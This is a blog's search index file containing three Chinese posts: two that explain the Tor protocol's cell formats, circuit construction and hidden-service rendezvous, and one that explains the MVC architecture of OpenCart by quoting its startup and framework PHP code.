<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[tor匿名协议理解二]]></title>
    <url>%2F2018%2F12%2F06%2Ftor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[在之前的一篇文章中，大致上介绍了客户端通过Tor网络实现匿名访问，以及服务器实现匿名服务的大致过程。在其中忽略了结点之间的连接细节，这篇文章将要针对结点间链路的建立细节展开叙述。 概述Tor匿名协议是建立在tcp连接之上的，在tcp之上运行着TLS传输层加密协议，保证Tor网络的对外加密性。注意到这里的对外加密和匿名性不是一个概念。对外加密是TLS实现，而匿名性则是通过链路机制实现。而链路是靠Cells建立的。所谓的Cells,可以直接理解成为了实现tor的匿名性而特意构建数据包（当然这不算严谨，后面会看到）。在这之中包含了一些标识位，这些标识位中的command字段，是整个网络的灵魂。控制着链路的创建，拓展，销毁；流的建立和应用数据的传输等等。 这里出现了三个比较容易混淆的概念：连接，链路，流，搞清这三个概念十分重要。连接的建立靠传输层TLS协议，保证了两节点间物理可通，是这一切的基础；而链路是通过Cells机制逐跳拓展的，链路真正实现了匿名性，在Cells中会有一个固定的字段标识一条链路；流是传输在链路之上的应用层数据，用来实现应用的通信，也会在Cells中唯一标识。所以从上到下的依赖关系为：流—-&gt;链路—-&gt;连接。 CellsCell是Tor中通信单元，也可以直接理解为。其本身在tcp/ip协议里面是应用层data部分。然后Tor通过把data也进行了字段的划分，如下图所示，把一些控制字段放在前，真正的数据部分放在payload字段。 如图，Tor协议中的数据包有两种，一种是定长Cell,一种是不定长Cell。链路的建立，拓展销毁，数据流的传送主要还是通过定长的Cells；而不定长的Cells主要用在握手协议上。 数据格式中的CMD1234567891011121314151617181920212223定长 Cell:0--PADDING （ Padding）1--CREATE （ Create acircuit）2--CREATED （ Acknowledge create）3--RELAY （ End-to-end data）4--DESTROY （ Stop using acircuit）5--CREATE_FAST（ Create acircuit， no PK）6--CREATED_FAST （ Circuit created， no PK）8--NETINFO （ Time andaddress info）9--RELAY_EARLY （ End-to-end data； limited）10--CREATE2 （ Extended CREATEcell）11--CREATED2 （ Extended CREATEDcell）不定长Cell:7--VERSIONS （ Negotiateprotocol version）128--VPADDING （ Variable-length padding）129--CERTS （ Certificates）130--AUTH_CHALLENGE（ Challenge value）131--AUTHENTICATE （ Client authenticate）132--AUTHORIZE （ Client authorization 以上是Cell中的CMD字段的值，前面的数字是命令代号，也就是直接显示在CMD位上的数值。通过两种Cell的不同命令设计，我们可以比较直观的看到两者的侧重点不一样，定长的Cell控制链路，而不定长的Cell偏向于连接的建立和认证。 定长Cell与RELAY Cell由于与匿名通信最直接相关的是定长的Cell，所以接下来我们主要分析定长的Cell的结构和链路控制的细节，从而弥补上一讲我们忽视的链路建立的细节。 定长CELL的固定长度为 512字节，其中链路 ID域占 2字节，数据指令域占1字节，负载占509字节。定长CELL主要用于链路相关操作：建立链路，维护链路，数据传输，断开链路等。另外，定长CELL还根据命令类型的不同分为控制数据Cell和转发数据Cell。其中， 控制数据Cell由洋葱路由器OR负责解释并处理， 转发数据Cell则用来发送端到端的数据（如图可以看到转发数据包的特殊格式）。注意到的是，每一种命令的Cell都会有自己的类似图中RELAY的自定义结构，这里为了解释链路的建立大致过程，抓住主要思想，详细解析RELAY转发Cell的细节，在之后的系列文章中，会逐渐把每种包的结构和细节进行阐述。 转发数据包头部共 11个字节， 分别为： CMD， 转发指令； Recog， 指定某个洋葱路由器接收的标志位； SID，数据流ID编号； CheckSum，数据流端到端验证用到的校验和； Len，负载中真实数据的长度。整个转发数据包，包括头部和负载， 在Tor网络传输过程中均利用CRT模式下的128-bit AES加密方式进行加密。 数据包延数据链路传递， 被逐跳解密，直到某一跳的洋葱路由器OR成功获得全 0的标志位 Recog，并成功验证数据包的校验和。该洋葱路由器再读取转发数据包头部的具体信息进行相应操作。 Relay CELL的指令域123456789101112131415161--RELAY_BEGIN [forward]2--RELAY_DATA [forward orbackward]3--RELAY_END [forward orbackward]4--RELAY_CONNECTED [backward]5--RELAY_SENDME [forward orbackward][control]6--RELAY_EXTEND [forward]7--RELAY_EXTENDED [backward]8--RELAY_TRUNCATE [forward]9--RELAY_TRUNCATED [backward]10 --RELAY_DROP [forward orbackward][control]11 --RELAY_RESOLVE [forward]12 --RELAY_RESOLVED [backward]13 --RELAY_BEGIN_DIR [forward]14 --RELAY_EXTEND2 [forward][control]15 --RELAY_EXTENDED2 [backward][control]32..40 -- 用于Hidden Service的Relay指令第二章 第二代洋葱路 其中， RELAY_BEGIN用于打开一个应用数据流；RELAY_DATA用于传送应用数据；RELAY_END用于彻底关闭一个应用数据流； RELAY_EXTEND和RELAY_EXTENDED用于将链路进行一跳的拓展；RELAY_TRUNCATE和RELAY_TRUNCATED用于将链路进行截断处理，也用于链路错误消息响应；RELAY_SENDME用于流量控制； RELAY_BIGIN_DIR用于开启到目录服务器的数据链路。同时，上述指令中仅被标记为forward的指令只能由链路发起者发送；仅被标记为 backward的指令只能由链路中的结点发送回链路发起者。另外，control标记主要表示该命令是用于链路相关控制，和应用层数据并无关系。 链路的建立与应用通信为了解析链路的建立细节，我们看官方设计文档的一张图： Alice是通信的发起者，并希望通过Tor 网络匿名地浏览 Website的内容。Alice的洋葱代理 OP首先选择Tor网络的中间转发结点并与之协商短期会话密钥，从而逐步建立一条通向Website的链路。 而后，当链路建立完成时， OP可以指示链路出口结点开启到 Website的 TCP连接，从而实现Alice与Website之间的匿名通信。具体的通信过程为（忽略了连接建立的过程，按照图中时序进行标号对应）： （1）Alice的洋葱代理OP首先发送一个Create命令数据包给它选定的第一个洋葱路由器 OR1（Bob）。其中c1表示Alice与Bob之间的链路 CircID， E(gx1)表示利用Bob洋葱密钥公钥加密的 DH 握手协议的第一部分内容。 （2）当 Bob接收到Alice发送来的Create命令数据包之后，返回一个对应的 Created 数据包。该数据包中包含：c1，Alice与 Bob之间的链路CircID；DH握手协议的第二部分内容的明文， gy1；临时会话密钥K1（gx1 ⋅y1）的哈希值， H(K1)。一旦链路建立， Alice和Bob就可以发送转发数据包（ Relay Cell），转发数据包的负载部分（ 509B）用其协商好的会话密钥Kl进行加密。 （3）为了扩展链路，Alice发送一个用 K1加密过的Relay Extend数据包（此数据包为转发数据包）给 Bob，其中包含： c1，Alice与Bob之间的链路 CircID；Relay指令 Extend：下一跳需要拓展到的洋葱路由器（Carol）的地址OR2；利用Carol洋葱密钥公钥加密的 DH握手协议的第一部分内容E(gx2)。 （4）Bob正确接收到Alice发送来的拓展命令之后，构建一个Create命令数据包。其中，c2表示Bob与Carol之间的链路CircID，E(gx2)是从 Alice处接收到的消息内容，表示利用Carol洋葱密钥公钥加密的DH握手协议的第一部分内容。Carol并不知道 Alice的存在。 （5）如Bob接收到Create命令数据包时一样，Carol返回一个Created数据包，其中包含：c2，Bob与 Carol之间的链路CircID；DH握手协议的第二部分内容的明文，gy2：临时会话密钥 K2（gx2⋅y2）的哈希值，H(K2)。 （6）当Bob收到 Carol响应信息后，Bob用他和Alice之间的会话密钥 Kl加密一个Relay Extended数据包（包含gy2和H(K2)），然后将它发回给 Alice。如此，原链路被拓展到了 Carol，且Alice和Carol的会话密钥为 K2。Alice只需重复上述过程，就可将虚电路长度逐步扩展，并最终与目的节点建立连接。一般说来，链路的长度应该为3以上，上图为了解释原理，进行了简化。 （7）当链路建立完毕后，Alice需要与website实现TCP层面上的握手。这时利用之前建立的链路，发送一个C1：Begin&lt;website&gt;:80命令到Bob。 （8）Bob经检验是合法的Alice传来的Begin命令后，向链路2转发C2：Begin&lt;website&gt;:80给Carol,然后按照这样的规律层层继续。在最后一个结点(图示中是Carol)负责开启一个TCP连接去获取网站信息。当连接建立完成，最后一个结点会层层回传连接建立成功的包。Carol回传Relay C2{connected}给Bob （9）Bob接收到Carol回传的连接建立Cell后，进行转发给Alice，Relay C1{connected} （10）当Alice接收到连接建立成功的消息后，Alice上层应用的数据就可以通过OP进行分片和利用之前链路建立协商的密钥进行层层加密，如同{ { {Payload} K1} K2 }K3。依次通过链路进行信息通信。 回顾这篇文章也是比较大致的阐述了链路建立的相关细节，并且使用的是官方设计文档的图例，这个图例是客户端实现匿名访问明网服务的的过程。理解了这个过程，读者可以发散思维，不难把它类比联想到客户端和匿名服务进行交互的细节。在访问匿名服务的时候，只不过是两端都建立了一条链路，通过约会结点来实现互通，而约会结点的协商则是通过客户端向介绍结点发送约会节点的ip和一次性秘密信息唯一标识一个约会结点并且通过一次性秘密信息来实现约会结点的认证。 参考https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf https://gitweb.torproject.org/torspec.git/tree/tor-spec.txt]]></content>
      <categories>
        <category>协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
        <tag>匿名通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tor匿名协议理解一]]></title>
    <url>%2F2018%2F12%2F06%2Ftor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%B8%80%2F</url>
    <content type="text"><![CDATA[近来对匿名网络的原理比较感兴趣，当然在现在的世界上也有者着一批匿名协议，其中tor的匿名协议可以说是比较成功的，所以打算以tor匿名协议为例，研究匿名通信的相关理论以及实现细节，这篇文章作为一个开篇，记录学习路上的心得。 概览 以下对tor协议系统的总结翻译自说明文档 Tor是一个基于TCP的，低延迟的匿名分布式覆盖网络应用集合，比如web浏览器，secure shell,即时通讯等。客户端通过网络建立一个链路，在这个链路中，每一个结点（OR），只知道它的前一个结点和后一个节点，但是不会知晓其他任何结点的相关信息。信息以固定大小的包流通在链路上，每个流过结点都使用对称密钥来解包，就好像一层一层的洋葱一样，然后包依次传递给下一个结点。 前置知识TLS（Transport Layer Security）安全传输层协议（TLS）用于在两个通信应用程序之间提供保密性和数据完整性。TSL是SSL的标准化，也就是访问https网址时候使用的加密协议，在tor协议里面，TSL用来进行每一层的通信加密。 协议的运行包含有三个阶段：12345（1） 客户端向服务器端索要并验证公钥。（2） 双方协商生成&quot;对话密钥&quot;。（3） 双方采用&quot;对话密钥&quot;进行加密通信。 更多的原理细节可以查看：https://en.wikipedia.org/wiki/Transport_Layer_Security Diffie-Hellman一种确保共享KEY安全穿越不安全网络的方法，也是现在普遍使用密钥交换协议。 更多细节请查阅：https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange Hash函数hash函数是一种将信息散列到固定长度的字符串的技术。 更多的细节可以查看：https://en.wikipedia.org/wiki/Hash_function 一致性hash更多的细节可以查看：http://afghl.github.io/2016/07/04/consistent-hashing.html 基本概念术语注意到下面的概念，读者一开始或许比较难以理解，觉得云里雾里。可以大致浏览一下，作为词典来对后面的协议解释中出现的专业名词进行回查。 OP（OnionProxy）：洋葱代理客户端，可以理解为下载了洋葱路由器的客户端,并且准备通过其进入匿名网络，访问匿名服务器或者通过tor网络来进行网络访问的客户端。需要注意的是客户端不参与路由。 OR（OnionRouter/Relays）：负责路由的一些中继结点集群。这些是真正的匿名访问实现的主干，是由一批志愿的路由集群组成，现在的路由结点大约在10000个左右。官方文档中所说的Relays,其实与之是同一个概念。 HS(Hidden Service:):匿名服务器是在洋葱网络里面提供服务的一批服务器，类似于外网中的服务器，只不过它的访问只能通过洋葱网络，并且根据匿名服务协议的规范，可以很好的保护匿名服务器。在外部网络中是不可以访问得到的。这类服务的域名通常由.onion结尾。 AS（App Server）：在洋葱网络中提供服务的服务器，和现实中的服务器的差别在于其是不需要通过DNS查询，而实基于一套匿名协议 标识符（Descriptor）：是一个唯一标识洋葱网络里面的路由（OR）结点（匿名服务器在宏观上也可归结为OR）的信息流，里面有IP，结点状态等基本信息，用来提交给目录权威来更新目录共识。 目录共识（consensus，下文直接称共识）：共识其实是一个文本，里面根据协议的规范，记录了洋葱网络里面的每一个路由结点的信息，包括一些状态标识，描述符，IP，端口，加密方式等等一系列的基本信息。并且由权威目录共同维护，更新，同步。该文件同步到每个客户端后，通常存放在[洋葱路由器安装目录]\Browser\TorBrowser\Data\Tor\cached-microdesc-consensus DS/DA（Directo Server/Directory Authority）：目录服务器，官方文档中也习惯性将之目录权威。是整个tor协议的指挥官，一般数目为10个左右，他们之间是一个分布式的共识系统，存储着整个洋葱网络路由结点的基本信息（有时也称为共识），每个洋葱路由结点都需要基于一定的时间向目录权威提交标识符来进行状态更新，同步和维护。目录权威里面还保存着一个长期使用的私钥，用来对证书进行签发。这个私钥是区别于洋葱路由的私钥的（这个细节是在版本2后修改的，过去目录权威的私钥和其作为OR时候的私钥是同一个）。权威目录在整个tor匿名服务不会改变，并且被直接硬编码到二进制文件，相关记录在源码里的\src\or\auth_dirs.inc 出口结点（Exit relay）：在tor的路由协议中，客户端（OP）想要访问实体网络，假设是www.baidu.com,那么它首先需要建立三跳的客户端匿名协议，然后在最后一个路由结点就称为出口节点，用来访问tor网络外部的服务器（www.baidu.com） 非出口结点（No-exit relay）:只在洋葱网络里面进行收发的不与外界网络相连的结点。可以和出口节点进行对比理解。 入口结点（Entry relay）：在客户端三跳实例中的第一个入口结点，是OP连入洋葱网络的第一个结点。通常是由守卫结点（Guard relay）和桥（Bridge）来扮演。 桥（Bridge）：桥是一批不出现在洋葱共识文件里面的结点，他们的存在是为了绕过一些国家或地区对tor的封锁，可以大致理解为一个代理，这些代理拥有连入tor网络的能力，但是不被记录在共识文件里面。 守卫结点（Guard relay）: 由OP选定的长期使用的作为第一个网络接入点的路由结点（OR），可以看成是一批特殊的OR，其目的就是为了降低一些可能的攻击带来的危害，在后面的针对Tor协议的常见攻击一节将会进行比较细致的讲解。 约会结点（Rendezvous point）：约会结点是在客户端连接tor匿名服务器的时候指定的交汇路由节点，用来连接介绍结点和客户端三跳路由结点。 目录缓存（Directory cache relays）:一些带宽比较大的路由节点，可以作为目录权威的缓存结点，提供给客户端获取共识文件，缓解权威目录的负载压力。而其本身的共识文件是根据目录权威来更新同步，然后权威通过分布式容错共识算法达成一致。所以权威目录具有这个洋葱网络路由记录（共识）的最终决定权。 可靠的目录镜像（ Fallback directory mirror）：这是个硬编码的初始目录列表，在源码的\src\or\fallback_dirs.inc进行记录。编译后就直接硬编码到二进制文件里，用来进行第一次共识的同步和更新。 链路（Circuit）：链路是在TLS连接建立的基础上，通过tor协议，一系列的cell的传输，通过其携带的一系列Create地Extend包等来构成一条通信链路。然后应用程序，这里专指web可以通过这条链路建立不同的通信流。从而完成通信。 客户端匿名访问协议和服务隐藏协议客户端匿名访问协议所谓的匿名访问协议指的是保护访问者的身份的一个Tor协议，它的实现是在已经建立的TLS链接的基础上，通过依次与OR进行DF密钥协商，然后使用交换后的加密密钥来进行上层应用的通信。因为协商密钥的过程是OP与OR依次按照顺序进行的，所以每个OR结点都只能知晓和自己相连的前一个和后一个节点，这样就可以起到很好的客户端匿名访问的功能。 以下图例来自官网，文字借鉴参考官方文档和硕士论文：《基于Tor的反向匿名信道建立技术研究》 Alice为使用洋葱代理OP的用户； Dave为目录服务器； Jane和 Bob为应用服务器（例如， Web服务器）；其他主机为互联网中的主机；而带绿色十字标志的为Tor网络中的结点，也就是洋葱路由器OR。此处以 Alice通过Tor网络进行应用服务器的访问为例，简单介绍Tor的主要工作过程。Alice在使用 Tor之前， 首先需要在其主机上安装洋葱代理OP并运行， 并将浏览器或其他需要使用匿名通信服务的应用程序的代理设置为本地 OP所监听的地址与端口。之后， Alice可以按照常规方式使用应用程序而无需做任何其他 Tor相关的操作。被启动之后， OP利用连通的Tor网络透明地执行以下过程：（1） OP尝试连接目录服务器，以获取Tor网络的结点信息；（2）当最新的 Tor网络结点列表被成功下载之后， OP可以根据自身默认的配置以及用户的配置进行Tor结点的选择，从而建立如下图所示的数据链路： 得注意的是，在链路建立的过程中，每次只拓展一个链路结点（关于建立连接和拓展的过程我们将在下一篇中进行细致的讲解）。并且， OP与链路上的每一个结点都会协商一组独立的对称密钥。这样，确保了每一跳在传送数据包时都无法被跟踪，也就是说，链路上的每一个结点只知道其前序结点和后继结点，而不会知道整条完整的链路。图2.2中，从Alice开始，绿色连接线的部分说明 Alice通过三次链路拓展形成一条完整的链路，并且链路是经过加密的。链路的出口结点利用非加密的方式连接到了应用服务器Bob。（3）一旦通信链路建立完成，各种类型的数据均可以进行交换，或者说各种不同类型的应用程序都可以利用 OP作为代理而是用Tor提供的匿名通信服务。当前， Tor仅支持 TCP数据流，并能够被支持SOCKS的任何应用程序所使用。 （4）为了提高效率和安全性， OP对数分钟内的连接请求均使用同一条链路，而之后的针对不同应用服务的连接请求又将被关联到新的链路，从而来防止攻击者将用户旧的行为和新的行为联系在一起。 如图2.3所示， 当用户需要请求新的应用服务之时，OP建立新的链路为用户应用请求服务。 以上就是客户端选择路由结点并且进行横向拓展的大致过程，但是其中很多的细节我们没有进行很深入的阐述，特别是连接的建立和多路复用的概念等，我们将在下一节中进行探究。 服务端隐藏协议在之前的讨论中，可以看到在Tor的协议中，客户端的匿名是可以得到保证的，那么在实际应用中，光光保护客户端的匿名性是不够的。服务端的匿名性也需要得到体现，所以服务端隐藏协议的目标是为想要对外提供服务的Tor服务器隐藏其具体位置。而这个功能的体现在tor协议中是通过介绍结点和约会结点来直接体现的。以下是具体的服务端身份匿名。 （1）Tor用户为了能够匿名地对外提供服务， 需要对Tor网络声明其存在。于是，在正式提供服务之前， Tor用户需要随机选取Tor 网络内的几个中继结点，建立到这些结点的链路，并通过告知这些结点该用户的服务公钥的方式来请求结点作为其介绍结点（ Introduction Point ）。 如图所示，提供匿名服务的 Tor用户Bob建立到IP1， IP2， IP3的三条链路， 并请求他们成为匿名服务的介绍结点。 而IP1， IP2， IP3三者只知道服务相关的公钥，并不知道提供服务的 Bob的IP地址或身份。 （2）如图 2.9所示， Bob为其特定的匿名服务生成一个匿名服务描述符。该描述符之中包括服务对应的公钥，服务介绍结点列表，以及利用服务私钥对该描述符前述部分的签名。匿名服务描述符在生成成功之后，被上传到分布式哈希表以供其他 Tor用户查找。查找索引为“ XYZ.onion” ，其中 XYZ为由匿名服务公钥生成而来的服务名， 包括 16个英文字母。 在该步完成之后， 匿名服务已被成功设置，并等待提供服务。 （3）当一个Tor用户想要请求匿名服务时， 需要先利用其他途径获得该匿名服务对应的洋葱地址， 即前述的“ XYZ.onion”。 得到洋葱地址之后， 该用户通过询问分布式哈希表来获得匿名服务描述符。若该描述符存在，则通过描述符，用户即可得知匿名服务的介绍结点列表以及所使用的公钥信息。在此期间，用户建立一条链路到一个随机挑选的中继结点，并通过告知该结点一个一次性秘密信息来请求其作为该用户的约会结点（ rendezvous point）。 （4）当匿名服务描述符下载完毕， 约会结点也成功设置之后， 请求匿名服务的 Tor用户构造一个由匿名服务公钥加密的消息。该消息的内容为约会结点的地址，以及先前预先协商完成的一次性秘密信息。该消息将通过 Tor链路被发送至匿名服务的某一个介绍结点， 而介绍结点则会将该消息回传给匿名服务提供者。如图2.11所示，匿名服务的提供方Bob与请求方Alice均通过Tor链路来进行数据通信，双方的身份信息都不会被泄露，从而保证了双方的安全性。 （5）匿名服务提供者 Bob获得匿名服务用户Alice发送来的加密的服务相关消息之后，进行解密，并获得其中的约会结点地址及一次性秘密信息。而后，Bob建立一条链路以连接到约会结点， 并向其发送接收到的一次性秘密信息。整个过程如图 （7）约会结点将已连接到匿名服务提供者Bob的消息告知匿名服务请求者Alice。在 Alice接收到该消息之后，其便可以利用通过约会结点建立起来的链路进行类似于常规Tor网络通信的正常通信。对于 Bob而言，也是类似的。主要的差别在于， Alice与Bob之间建立的链路是特殊链路，该链路在通常情况下由6个结点组成。在链路之中的约会结点很明了地知道自身的身份：约会结点。 整个HiddenService协议的运行过程之中，协议力求保证通信双方的匿名性。协议中所选用的IP1， IP2， IP3，以及RP均无法确切得知通信双方的身份及地理位置， 匿名性由Tor链路的特性（ 单个路由无法得知整条链路） 提供保障。 最终通信双方生成的链路为一条长链路， 通常情况下为6跳。 链路的长度是普通链路的2倍，一定程度上降低了传输效率，这就是使用Tor浏览器的时候会普遍比较卡顿的原因。 参考链接http://www.ruanyifeng.com/blog/2014/02/ssl_tls.htmlhttps://gitweb.torproject.org/torspec.git/tree/PDF: tor-design.pdfhttps://www.torproject.org/projects/torbrowser/design/https://www.freehaven.net/anonbib/topic.html#Anonymous_20communication]]></content>
      <categories>
        <category>协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
        <tag>匿名通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于opencert的MVC架构理解]]></title>
    <url>%2F2018%2F12%2F06%2F%E5%9F%BA%E4%BA%8Eopencert%E7%9A%84MVC%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在学习了一些比较基础的web开发知识和经理一些实践之后，逐渐发觉web框架的重要性，好的框架是可以带来很大的便利的，也能够使得自己的应用变得更加的健壮。同时学习框架也使得自己在大局掌控上跟进一个台阶，同时也可以更贴近web服务的开发现状，不论是对以后的开发或者是安全审计都可以有很大的促进。在框架领域，MVC的概念是不得不深入学习的，它不只是一种技术架构，更是一种编程思想，开发思想。本文将从opencart的实例出发去学习MVC的架构思想，现总结如下： MVC三层架构含义MVC框架的作用在于分层解耦，让层与层之间的联系变得不那么紧密，同时可以很大程度的提高并行开发效率，以及更高的代码重用和方便的代码维护。 Model：模型用于表示底层数据模型结构，可能会被不同的应用程序共享，一个模型应该遵循以下的原则：（1）包含属性用于描述特定的数据（2）应该包含业务逻辑，以确保数据能够满足表现的需要（3）应该包含数据操作的逻辑，如数据的增删改等（4）不应使用$_GET $POST这样的数据，是基于model的功能和重用的考虑（5）不应出现Html代码，不属于model层的范畴 View：View层（视图）主要用于前端的表现：（1）包含Html，以及所有负责表现的代码，可以出现php，但只是用于遍历数据（2）不应该包含Db请求，数据库的操作（3）不应该出现引用$_GET $_POST这类数组的代码，View只专注于表现（4）如果必要，可以访问Model和Controller的属性，不过仅为了满足表现的需要 Controller：控制器直接负责用户的请求，对Model的调用即对View表现的控制：（1）可以访问$_GET $_POST 这样的用户请求数组（2）创建模型，并决定一个模型对象的生命周期（3）不应该出现SQL语句，数据库请求应该放到Model中（4）不应该出现Html代码，应该将其放入View中 模板引擎模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档python与php常用模板引擎举例：12345//phpSmarty,Twig,Haml,Liquid,Mustache,Plates//pythonJinja2,Mako,pyTenjin,PyJade,cheetah,django...... web框架web服务器封装的是socket，web框架封装的是response和request。web服务器（web server）的主要作用是，接收客户端请求，而web框架（webframework）则是处理web服务器收到的请求，并生成HTML内容，将生成的内容传递给web服务器，再由web服务器返回给客户端。所以，web框架是面像开发的，而web服务器是面向连接的。现如今，类似于php，java, python这样的语言都有很多集成的框架来加速开发和使得代码更方便维护等。而在现在比较出名的框架，诸如struts,spring,django,thinkphp等都是采用MVC的设计理念，使得代码更健壮。 opencert为例深入理解MVC开发模式OpenCart 是世界著名的开源电子商务系统，系统开发语言为 PHP。早期由英国人 Daniel Kerr 个人开发，目前项目托管在 GitHub。该项目采用 MVCL 架构、代码清晰规范、安装方便，使得开发者可以轻易上手进行定制开发。详情参看百度百科 简化的目录结构（只专注于学习MVC需要了解到的目录结构）123456789101112131415161718192021222324---upload/#核心代码文件夹||------index.php #web应用入口，检测安装以及安装完成的MVC入口指向startup.php------image/ #存放构建网站所需要的图片------install/ #安装目录，采用MVC的布局------admin/ #管理后台目录，采用MVC布局------catalog/ #网站应用业务目录，采用MVC布局------system/ #MVC的架构底层实现 | | ----engine/#MVC的底层引擎实现 | | | | | -----------action.php #属于router.php的子类，主要用来进行url与内部controller的路由 | -----------controller.php #controller的超类 | -----------loader.php #对象装载类 | -----------model.php #model超类 | -----------router.php #略 | ...... ----startup.php #MVC文件入口 ----framework.php #框架注册或者说是register变量的封装 ...... 一次完整的请求过程下面的例子中，将会对admin管理后台下的customer管理业务进行分析。那么业务最直接的MVC架构文件是是admin下/controller/customer/,/view/customer/,以及/model/customer。我们可以看到在实际的管理界面访问这个网站的界面如图所示: 注意到这个网站的URLhttp://localhost/OpenCart/upload/admin/index.php?route=customer/customer&amp;user_token=S9dNbDGlubJVFpjFllGyYfgg9BCdoCCr 根据网站的目录显示我们先跟进到/upload/admin/index.php这是管理后台的首页，其实在upload/文件下有也有一个index.php是默认对外提供服务的首页，其内容和现在我们看到的基本一样，只不过在用户标识上有细微的差别。 在这个index界面是对配置文件的加载和安装的检查，然后includeupload/system/startup.php,我们看下startup.php的具体内容。12345678910111213141516&lt;?php// Error Reportingerror_reporting(E_ALL);// Check Version...// Windows IIS Compatibility...// Check if SSL...// Modification Override...// Helper...function start($application_config) &#123; require_once(DIR_SYSTEM . 'framework.php'); &#125; 可以在源文件里面看到，startup.php首先是对php版本检查，时区检查，平台检查，是否开启ssl，一些引擎，插件等的装载（直观的说是include）,然后就是includeupload/system/framework.php。这个文件其实是注册了一个registry对象，这个对象是后面传递给controller，modle的第一个参数，里面封装了一些底层框架必须的类操作，而这些类都是继承来自engine/下定义的类，或其他通过startup.php include文件定义的类。所以说这个源文件相对重要，现在把framework.php全部代码展现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170&lt;?php// Registry$registry = new Registry();// Config$config = new Config();// Load the default config$config-&gt;load('default');$config-&gt;load($application_config);$registry-&gt;set('config', $config);// Log$log = new Log($config-&gt;get('error_filename'));$registry-&gt;set('log', $log);date_default_timezone_set($config-&gt;get('date_timezone'));set_error_handler(function($code, $message, $file, $line) use($log, $config) &#123; // error suppressed with @ if (error_reporting() === 0) &#123; return false; &#125; switch ($code) &#123; case E_NOTICE: case E_USER_NOTICE: $error = 'Notice'; break; case E_WARNING: case E_USER_WARNING: $error = 'Warning'; break; case E_ERROR: case E_USER_ERROR: $error = 'Fatal Error'; break; default: $error = 'Unknown'; break; &#125; if ($config-&gt;get('error_display')) &#123; echo '&lt;b&gt;' . $error . '&lt;/b&gt;: ' . $message . ' in &lt;b&gt;' . $file . '&lt;/b&gt; on line &lt;b&gt;' . $line . '&lt;/b&gt;'; &#125; if ($config-&gt;get('error_log')) &#123; $log-&gt;write('PHP ' . $error . ': ' . $message . ' in ' . $file . ' on line ' . $line); &#125; return true;&#125;);// Event$event = new Event($registry);$registry-&gt;set('event', $event);// Event Registerif ($config-&gt;has('action_event')) &#123; foreach ($config-&gt;get('action_event') as $key =&gt; $value) &#123; foreach ($value as $priority =&gt; $action) &#123; $event-&gt;register($key, new Action($action), $priority); &#125; &#125;&#125;// Loader$loader = new Loader($registry);$registry-&gt;set('load', $loader);// Request$registry-&gt;set('request', new Request());// Response$response = new Response();$response-&gt;addHeader('Content-Type: text/html; charset=utf-8');$response-&gt;setCompression($config-&gt;get('config_compression'));$registry-&gt;set('response', $response);// Databaseif ($config-&gt;get('db_autostart')) &#123; $registry-&gt;set('db', new DB($config-&gt;get('db_engine'), $config-&gt;get('db_hostname'), $config-&gt;get('db_username'), $config-&gt;get('db_password'), $config-&gt;get('db_database'), $config-&gt;get('db_port')));&#125;// Session$session = new Session($config-&gt;get('session_engine'), $registry);$registry-&gt;set('session', $session);if ($config-&gt;get('session_autostart')) &#123; /* We are adding the session cookie outside of the session class as I believe PHP messed up in a big way handling sessions. Why in the hell is it so hard to have more than one concurrent session using cookies! Is it not better to have multiple cookies when accessing parts of the system that requires different cookie sessions for security reasons. Also cookies can be accessed via the URL parameters. So why force only one cookie for all sessions! */ if (isset($_COOKIE[$config-&gt;get('session_name')])) &#123; $session_id = $_COOKIE[$config-&gt;get('session_name')]; &#125; else &#123; $session_id = ''; &#125; $session-&gt;start($session_id); setcookie($config-&gt;get('session_name'), $session-&gt;getId(), (ini_get('session.cookie_lifetime') ? (time() + ini_get('session.cookie_lifetime')) : 0), ini_get('session.cookie_path'), ini_get('session.cookie_domain'));&#125;// Cache$registry-&gt;set('cache', new Cache($config-&gt;get('cache_engine'), $config-&gt;get('cache_expire')));// Urlif ($config-&gt;get('url_autostart')) &#123; $registry-&gt;set('url', new Url($config-&gt;get('site_url')));&#125;// Language$language = new Language($config-&gt;get('language_directory'));$registry-&gt;set('language', $language);// Document$registry-&gt;set('document', new Document());// Config Autoloadif ($config-&gt;has('config_autoload')) &#123; foreach ($config-&gt;get('config_autoload') as $value) &#123; $loader-&gt;config($value); &#125;&#125;// Language Autoloadif ($config-&gt;has('language_autoload')) &#123; foreach ($config-&gt;get('language_autoload') as $value) &#123; $loader-&gt;language($value); &#125;&#125;// Library Autoloadif ($config-&gt;has('library_autoload')) &#123; foreach ($config-&gt;get('library_autoload') as $value) &#123; $loader-&gt;library($value); &#125;&#125;// Model Autoloadif ($config-&gt;has('model_autoload')) &#123; foreach ($config-&gt;get('model_autoload') as $value) &#123; $loader-&gt;model($value); &#125;&#125;// Route$route = new Router($registry);// Pre Actionsif ($config-&gt;has('action_pre_action')) &#123; foreach ($config-&gt;get('action_pre_action') as $value) &#123; $route-&gt;addPreAction(new Action($value)); &#125;&#125;// Dispatch$route-&gt;dispatch(new Action($config-&gt;get('action_router')), new Action($config-&gt;get('action_error')));// Output$response-&gt;output(); 